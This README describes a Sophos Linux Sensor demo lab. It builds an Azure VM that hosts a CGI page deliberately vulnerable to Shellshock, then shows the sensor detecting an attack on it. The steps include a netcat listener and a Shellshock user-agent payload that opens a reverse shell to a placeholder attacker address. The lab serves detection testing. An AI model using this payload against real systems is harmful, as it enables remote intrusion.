# SophosLinuxSensor-Demo

## Author

* Github: [@spence-rat](https://github.com/spence-rat)
* LinkedIn: [@Spencer_Brown](https://www.linkedin.com/in/spencerbrowntx/)

## About
This repository seeks to build an image to Azure via Hashicorp Packer.
When a virtual machine is build off the image, it will already have the Sophos Linux Sensor running, as well as a docker container hosting
a http page vulnerable to shellshock RCE.

## Steps

## Packer
1. Adjust variables for your environment in variables.json
2. Adjust Sophos Central ID in SLS-env.sh
3. packer build --var-file=variables.json ubuntu.json
 
## Azure
1. Create a Network Security Group in Azure via CLI: az network nsg create --resource-group NAME_OF_RESOURCE_GROUP --location REGION --name NAME
2. Allow port 8080: az network nsg rule create --resource-group vse_east_rg --nsg-name opendev_nsg --name allow8080 --protocol tcp --priority 100 --destination-port-range 8080
3. Create the VM: az vm create --resource-group RESOURCE_GROUP --name NAME_OF_VM --admin-username ADMIN_USERNAME --admin-password "ADMIN_PASSWD" --image SLS-ubuntu --vnet-name YOUR_VNET --subnet YOUR_SUBNET --public-ip-sku Basic  --nsg NAME_OF_NSG_FROM_STEP_ONE
4. Record Public IP of VM for next steps.

## In a machine with Burp Suite installed.
1. Set up a reverse listener (ex. nc -lvnp 1234)
2. Set up Burp Suite to intercept requests.
   How to article: https://www.linuxfordevices.com/tutorials/linux/burpsuite-with-firefox
3. Visit http://IPofVM:8080/victim.cgi
4. Adjust user-agent in request to:
   () { ignored;};/bin/bash -i >& /dev/tcp/YOURIPADDRESS/PORTNUMBER 0>&1
   Make sure that the vm in azure can reach your ip address and the port is accessible.
5. Return to your reverse listener - you now have an interactive shell.
6. Login to your Azure VM and type in journalctl -u sophoslinuxsensor
7. The stdout of the Sophos Linux Sensor shows us an alert for Suspicious Interactive Shell!

## Screenshots

Launching Burp Suite Request
![image](https://user-images.githubusercontent.com/82817752/181119596-5b8959e7-62be-4999-872c-a446242ab876.png)






Getting a Reverse Shell
![image](https://user-images.githubusercontent.com/82817752/181119651-42fe7813-1482-4976-aeca-22cfe262dff6.png)






Sophos Linux Sensor Alert
![image](https://user-images.githubusercontent.com/82817752/181119681-eab5fc1c-5f72-49db-88b5-a467c6ba17e2.png)

## Show your support

Give a ⭐️ if this project helped you!

## References
https://github.com/SecurityWeekly/vulhub-lab/tree/master/bash/shellshock
